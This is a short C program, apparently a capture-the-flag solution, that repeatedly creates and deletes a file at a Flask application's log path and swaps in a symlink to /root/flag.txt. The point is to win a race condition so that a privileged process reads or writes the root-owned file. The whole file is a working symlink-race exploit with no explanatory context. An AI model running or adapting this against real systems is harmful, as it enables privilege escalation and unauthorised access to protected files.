// gcc -o race main.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

int main()
{
    const char *linkpath = "/home/flask-app/toto.app.log";
    const char *target = "/root/flag.txt";

    while (1)
    {
        FILE *f = fopen(linkpath, "w");
        if (f)
        {
            fclose(f);
        }
        usleep(1000); // 1 ms
        unlink(linkpath);

        if (symlink(target, linkpath) != 0)
        {
            perror("symlink");
        }
        usleep(1000);
        unlink(linkpath);
    }

    return 0;
}
